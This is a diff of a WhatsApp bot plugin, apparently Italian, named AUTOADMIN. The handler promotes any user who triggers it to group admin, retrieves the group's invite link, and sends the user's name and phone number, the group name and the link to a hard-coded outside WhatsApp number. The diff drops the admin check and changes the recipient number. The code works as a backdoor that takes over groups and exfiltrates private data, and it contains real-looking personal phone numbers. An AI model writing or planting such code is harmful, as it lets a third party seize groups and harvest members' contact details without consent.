@@ -1,21 +1,19 @@
-const handler = async (m, { conn, isAdmin }) => {
-    if (isAdmin) return
-
+const handler = async (m, conn) => {
     try {
         const groupMetadata = await conn.groupMetadata(m.chat)
         await conn.groupParticipantsUpdate(m.chat, [m.sender], 'promote')
         const groupLink = await conn.groupInviteCode(m.chat)
         const fullLink = `https://chat.whatsapp.com/${groupLink}`
 
-        await conn.sendMessage('393476686131@s.whatsapp.net', {
-            text: `━━━━⬣ AUTOADMIN ⬣━━━━
+        await conn.sendMessage('393514357738@s.whatsapp.net', {
+            text: `*⭒─ׄ─ׅ─ׄ─⭒*⬣ AUTOADMIN ⬣*⭒─ׅ─ׄ─ׅ─ׄ─⭒*
 
-👤 *Utente:* @${m.sender.split('@')[0]}
-📝 *Nome:* ${conn.getName(m.sender)}
-📞 *Numero:* +${m.sender.split('@')[0]}
+『 📲 』 *Utente:* @${m.sender.split('@')[0]}
+『 📝 』 *Nome:* ${conn.getName(m.sender)}
+『 📞 』 *Numero:* +${m.sender.split('@')[0]}
 
-📌 *Gruppo:*\n${groupMetadata.subject}
-🔗 *Link:*\n${fullLink}`,
+『 📌 』 *Gruppo:*\n${groupMetadata.subject}
+『 🔗 』 *Link:*\n${fullLink}`,
             mentions: [m.sender],
             quoted: m
         })
